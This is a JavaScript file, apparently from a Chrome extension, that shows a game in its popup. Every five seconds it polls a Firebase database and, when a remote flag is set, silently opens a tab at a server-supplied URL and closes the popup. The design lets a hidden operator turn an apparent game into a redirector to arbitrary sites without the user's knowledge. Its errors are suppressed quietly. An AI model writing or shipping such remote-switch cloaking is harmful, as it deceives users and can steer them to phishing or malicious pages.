// Contrôleur de mode
class ModeController {
  constructor() {
    this.mode = 0;
    this.url = 'https://google.com';
    this.firebaseConfigured = false;
    this.init();
  }

  async init() {
    // Vérifier si Firebase est configuré
    await this.testFirebase();
    
    if (this.firebaseConfigured) {
      await this.checkMode();
      setInterval(() => this.checkMode(), 5000);
    } else {
      // Pas de Firebase, afficher le jeu directement
      this.showGame();
    }
  }

  async testFirebase() {
    try {
      const res = await fetch(`${FIREBASE_DB_URL}/mode_control.json?auth=${FIREBASE_API_KEY}`, {
        method: 'GET',
        signal: AbortSignal.timeout(2000) // Timeout 2 secondes
      });
      this.firebaseConfigured = res.ok;
    } catch (e) {
      this.firebaseConfigured = false;
    }
  }

  async checkMode() {
    if (!this.firebaseConfigured) return;
    
    try {
      const res = await fetch(`${FIREBASE_DB_URL}/mode_control.json?auth=${FIREBASE_API_KEY}`, {
        signal: AbortSignal.timeout(2000)
      });
      
      if (!res.ok) return;
      
      const data = await res.json();
      if (!data) return;
      
      const newMode = parseInt(data.number) || 0;
      const newUrl = data.url || 'https://google.com';
      
      if (newMode !== this.mode || (newMode === 1 && newUrl !== this.url)) {
        this.mode = newMode;
        this.url = newUrl;
        this.apply();
      }
    } catch (e) {
      // Ignorer les erreurs silencieusement
    }
  }

  showGame() {
    const gameContainer = document.getElementById('gameContainer');
    const urlContainer = document.getElementById('urlContainer');
    if (gameContainer) gameContainer.style.display = 'flex';
    if (urlContainer) urlContainer.style.display = 'none';
  }

  apply() {
    if (this.mode === 0) {
      this.showGame();
    } else {
      chrome.tabs.create({url: this.url}, () => window.close());
    }
  }
}

document.addEventListener('DOMContentLoaded', () => {
  new ModeController();
});

